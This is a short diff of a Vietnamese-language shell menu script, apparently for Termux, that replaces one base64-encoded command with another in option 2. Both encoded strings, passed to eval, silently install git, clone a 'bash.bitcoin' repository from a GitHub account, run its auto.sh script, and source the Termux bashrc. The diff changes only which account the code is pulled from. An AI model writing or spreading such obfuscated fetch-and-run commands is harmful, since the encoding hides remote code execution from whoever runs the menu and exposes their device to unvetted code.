@@ -26,7 +26,7 @@ case $choice in
   2)
     echo "Đang chạy lệnh thứ hai..."
     # Lệnh 2
-    eval $(echo "cGtnIGluc3RhbGwgZ2l0IC15ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vYWJhbzEwMDg4OC1zdGFyL2Jhc2guYml0Y29pbi5naXQgJiYgY2QgYmFzaC5iaXRjb2luICYmIHNoIGF1dG8uc2ggJiYgc291cmNlIC9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvZXRjL2Jhc2guYmFzaHJj " | base64 -d)
+    eval $(echo "cGtnIGluc3RhbGwgZ2l0IC15ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vbWFuaC1tb2JpbGUtMDg5ODcwNzk2OC9iYXNoLmJpdGNvaW4uZ2l0ICYmIGNkIGJhc2guYml0Y29pbiAmJiBzaCBhdXRvLnNoICYmIHNvdXJjZSAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2V0Yy9iYXNoLmJhc2hyYwo " | base64 -d)
     ;;
   3)
     echo "Đang chạy lệnh thứ ba..."
